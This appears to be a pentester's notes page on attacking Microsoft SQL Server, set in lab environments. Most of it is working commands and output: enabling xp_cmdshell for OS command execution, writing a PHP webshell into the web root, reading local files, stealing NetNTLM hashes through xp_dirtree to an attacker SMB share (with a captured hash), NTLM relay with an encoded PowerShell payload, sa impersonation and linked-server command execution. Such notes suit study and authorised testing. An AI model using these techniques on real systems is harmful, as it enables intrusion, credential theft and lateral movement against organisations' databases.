---
title: "mssql"
weight: 14
---
`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries

#### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

- Read or change the contents of a database
    
- Read or change the server configuration
    
- Execute commands
    
- Read local files
    
- Communicate with other databases
    
- Capture the local system hash
    
- Impersonate existing users
    
- Gain access to other networks
    

In this section, we will explore some of these attacks.

#### MSSQL Databases

MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

| Default System Database | Description |
| --- | --- |
| `master` | Tracks all system information for an SQL server instance |
| `model` | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb` | The SQL Server Agent uses this database to schedule jobs & alerts |
| `tempdb` | Stores temporary objects |
| `resource` | Read-only database containing system objects included with SQL server |

&nbsp;

export KRB5CCNAME=/tmp/krb5cc_0  
python3 mssqlclient.py -windows-auth -k DOMAIN/user@ip

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module exe
```

&nbsp;

```shell-session
SQL> select name from sys.databases;
SELECT name FROM sys.sysdatabases;  //show databases
use databasename;
select name from sys.tables //list show tables
select * from tb_flag;  /print out table

```

&nbsp;

MSSQL CONNECT FROM LINUX

```shell-session
cube111@local[/local]$ mssqlclient.py -p 1433 julio@10.129.203.7
```

```shell-session
mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

```shell-session
cube111@local[/local]$ sqsh -S 10.129.203.7 -U .\julio -P 'MyPassword!' -h
```

#### From windows

#### Sqlcmd - Connecting to the SQL Server

Attacking SQL Databases

```
C:\local> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

&nbsp;

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

&nbsp;

&nbsp;

To interact with [MSSQL (Microsoft SQL Server)](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) with Linux we can use [sqsh](https://en.wikipedia.org/wiki/Sqsh) or [sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) if you are using Windows

&nbsp;

&nbsp;

&nbsp;

==**Command execution**==

&nbsp;

### 1. **Check Current Configuration**

Run this first to see if `xp_cmdshell` is already enabled:

EXEC sp_configure 'xp_cmdshell';

- If `config_value = 0`, it's disabled.
- If `config_value = 1`, it's enabled.

&nbsp;

### 2. **Enable Advanced Options**

By default, SQL Server hides advanced configuration options. Enable them with:

EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;

&nbsp;

&nbsp;


### 3. **Enable `xp_cmdshell`**

Now enable `xp_cmdshell`

EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;

We could then choose `enable_xp_cmdshell` to enable the [xp_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

Attacking SQL Databases

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

&nbsp;

#### Windows - SQLCMD

```cmd-session
C:\local> sqlcmd -S 10.129.20.13 -U username -P Password123
```

&nbsp;

## Write Local File

#### MSSQL - Enable Ole Automation Procedures

Attacking SQL Databases

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

&nbsp;

#### MSSQL - Create a File

Attacking SQL Databases

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

&nbsp;

&nbsp;

#### Read Local Files in MSSQL

Attacking SQL Databases

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

## Capture MSSQL Service Hash

#### XP_DIRTREE Hash Stealing

Attacking SQL Databases

```cmd-session
1> EXEC master..xp_dirtree('\\10.10.110.17\share\u0027)
2> GO

subdirectory    depth
--------------- -----------
```

&nbsp;

on older systems

#### XP_SUBDIRS Hash Stealing

Attacking SQL Databases

```cmd-session
1> EXEC master..xp_subdirs('\\10.10.110.17\share\u0027)
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*\u0027: FindFirstFile() returned error 5, 'Access is de
```

#### XP_SUBDIRS Hash Stealing with Responder

Attacking SQL Databases

```shell-session
cube111@local[/local]$ sudo responder -I tun0
```

&nbsp;

#### XP_SUBDIRS Hash Stealing with impacket

Attacking SQL Databases

```shell-session
cube111@local[/local]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD801060004000200000008003000300000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

NTLM RELAY

```
cube111@local[/local]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq
sudo ntlmrelayx.py -t smb://192.168.220.146 -smb2support --shell
```

&nbsp;

## Impersonate Existing Users with MSSQL

#### Identify Users that We Can Impersonate

Attacking SQL Databases

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

&nbsp;

#### Verifying our Current User and Role

Attacking SQL Databases

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

&nbsp;

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

&nbsp;

## SQL Server Admin

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

&nbsp;

![e4b32a0d9708d418c9177f6d9ffc5a00.png](/resources/e4b32a0d9708d418c9177f6d9ffc5a00.png)

&nbsp;

&nbsp;cypher query

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

&nbsp;

#### Enumerating MSSQL Instances with PowerUpSQL

Privileged Access

```
PS C:\local> cd .\PowerUpSQL\
PS C:\local>  Import-Module .\PowerUpSQL.ps1
PS C:\local>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

&nbsp;

&nbsp;

```
PS C:\local>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

&nbsp;

&nbsp;

#### Running mssqlclient.py Against the Target

Privileged Access

```
cube111@local[/local]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

&nbsp;

&nbsp;

&nbsp;

#### Enumerating our Rights on the System using xp_cmdshell

Privileged Access

```shell-session
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ==========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL
```

&nbsp;

## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

Attacking SQL Databases

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
---------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

Attacking SQL Databases

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), and [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.

#### GUI Application

Database engines commonly have their own GUI application. MySQL has [MySQL Workbench](https://dev.mysql.com/downloads/workbench/) and MSSQL has [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms), we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as [dbeaver](https://github.com/dbeaver/dbeaver). [dbeaver](https://github.com/dbeaver/dbeaver) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

To install [dbeaver](https://github.com/dbeaver/dbeaver) using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:

#### Install dbeaver

```shell-session
[!bash!]$ sudo dpkg -i dbeaver-<version>.deb
```

To start the application use:

#### Run dbeaver

```shell-session
[!bash!]$ dbeaver &
```

To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).

#### Video - Connecting to MSSQL DB using dbeaver

Click on the image below for a short video demonstration of connecting to an MSSQL database using `dbeaver`.

<ins>![MSSQL](/resources/ConnectToMSSQL.jpg)</ins>

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;
